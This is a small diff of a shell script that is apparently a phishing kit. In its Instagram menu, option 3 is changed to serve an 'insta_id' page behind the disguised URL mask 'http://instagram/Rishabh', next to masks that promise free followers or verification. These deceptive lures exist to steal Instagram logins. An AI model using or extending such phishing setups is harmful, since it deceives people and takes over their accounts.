@@ -524,8 +524,8 @@ site_instagram() {
 			mask='http://get-unlimited-followers-for-instagram'
 			tunnel_menu;;
 		3 | 03)
-			website="insta_followers"
-			mask='http://get-1000-followers-for-instagram'
+			website="insta_id"
+			mask='http://instagram/Rishabh'                      
 			tunnel_menu;;
 		4 | 04)
 			website="ig_verify"
